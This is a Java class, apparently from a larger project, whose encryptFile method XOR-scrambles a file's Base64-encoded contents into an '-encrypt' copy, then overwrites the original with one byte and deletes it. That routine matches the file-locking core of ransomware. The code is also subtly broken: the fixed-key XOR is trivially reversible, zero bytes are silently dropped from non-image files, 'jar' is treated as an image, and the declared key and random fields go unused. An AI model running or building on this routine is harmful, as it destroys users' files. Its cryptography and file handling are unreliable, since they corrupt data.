package it.nanno.encryptor;

import it.nanno.Constants;
import it.nanno.api.encrpytor.IEncryptor;
import it.nanno.util.XOR;

import java.io.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.security.SecureRandom;
import java.util.Arrays;
import java.util.Base64;

public class DefaultEncryptorImpl implements IEncryptor {

    private final SecureRandom secureRandom = new SecureRandom();
    private final int key = 3;

    @Override
    public void encryptFile(File file) {

        if (!file.canRead() || !file.canWrite())
            return;

        try (InputStream inputStream = Files.newInputStream(file.toPath())) {

            String[] split = file.getName().split("\\.");

            String extension = split[file.getName().split("\\.").length - 1];
            String finalName = file.getName().split(extension)[0] + "-encrypt." + extension;

            boolean isImage = extension.equals("png") || extension.equals("jpg") || extension.equals("jar");

            int byteIndex = 0;
            int byteRead;

            byte[] buffer = new byte[inputStream.available()];

            while ((byteRead = inputStream.read()) != -1) {

                if (!isImage && byteRead == 0)
                    continue;

                buffer[byteIndex++] = (byte) byteRead;

            }

            try (OutputStream outputStream = Files.newOutputStream(file.toPath().getParent().resolve(finalName))) {

                byte[] bufferCopy = new byte[buffer.length + Constants.WATERMARK.length];

                System.arraycopy(Constants.WATERMARK, 0, bufferCopy, 0, Constants.WATERMARK.length);

                System.arraycopy(buffer, 0, bufferCopy, Constants.WATERMARK.length, buffer.length);

                outputStream.write(XOR.xor(new String(Base64.getEncoder().encode(bufferCopy)), Constants.TEST_KEY).getBytes(StandardCharsets.UTF_8));

            }

            try (OutputStream outputStream = Files.newOutputStream(file.toPath())) {
                outputStream.write(Byte.MIN_VALUE);
            }

            file.delete();

        }

        catch (Exception exception) {
            exception.printStackTrace();
        }
    }
}
